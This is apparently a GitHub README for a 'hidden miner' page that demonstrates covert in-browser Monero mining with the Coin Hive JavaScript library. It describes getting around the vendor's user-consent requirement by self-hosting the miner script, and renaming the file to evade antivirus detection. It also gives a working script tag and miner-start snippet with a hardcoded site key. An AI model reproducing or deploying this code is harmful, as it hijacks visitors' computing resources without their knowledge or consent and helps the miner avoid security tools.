# Coin-Hive_Hidden-Miner.github.io

<h2>Silent HTML Monero Miner</h2>

https://jonnybanana.github.io/Coin-Hive_Hidden-Miner.github.io/

![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/coinhive-icon.png)

I have created this simple html page as a demonstration on how to make hidden the javascript miner of Coin Hive.<BR>
In fact, even if the site says that you can not use the miner without the consent of the user, in reality, things are very different ...</BR>
In part however it is true what they say, in fact if you try to call the .js file of the miner directly from their servers, that is:

https://coinhive.com/lib/coinhive.min.js?v8</BR>
https://authedmine.com/lib/authedmine.min.js?v8

you will see that the user's consent will be required, but the thing is easily circumvented, in fact just host the .js file directly on the server where you host the html page you want to use for the miner, for security I also changed the file name, since now the miner is well known by the vendor antivirus and company ....

<h3> Requirements </h3>

* a Coin Hive Account (https://coinhive.com)
* a Monero Wallet to make the withdraw  (https://mymonero.com/#/)
* a Web Server or a Website (also Github)
* a Coin Hive site key


<h3> Browser Compatibility </h3>

All

<h3> How it Works??? </h3>

![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/screenshot.JPG)

https://coinhive.com/documentation/miner#constructor-options

https://coinhive.com/lib/coinhive.min.js?v8

 <script src="https://jonnybanana.github.io/Coin-Hive_Hidden-Miner.github.io/pino.js"></script>
<script>
 var miner = new CoinHive.Anonymous('YhWQAh8Vm7tIshKjOsp75jpDDVaO5kkU', {throttle: 0.2});
  miner.start();
</script> 

![Alt text](http://www.imigliorifaucet.it/g1.gif)




<h3> Curiosity </h3>

The image PNG used as background in this example is actually a simple algorithm designed / written in PIET.</BR>
Who wants can test it in the online interface from here: https://www.bertnase.de/npiet/npiet-execute.php


![Alt text](https://raw.githubusercontent.com/JonnyBanana/Coin-Hive_Hidden-Miner.github.io/master/img/bit.png)
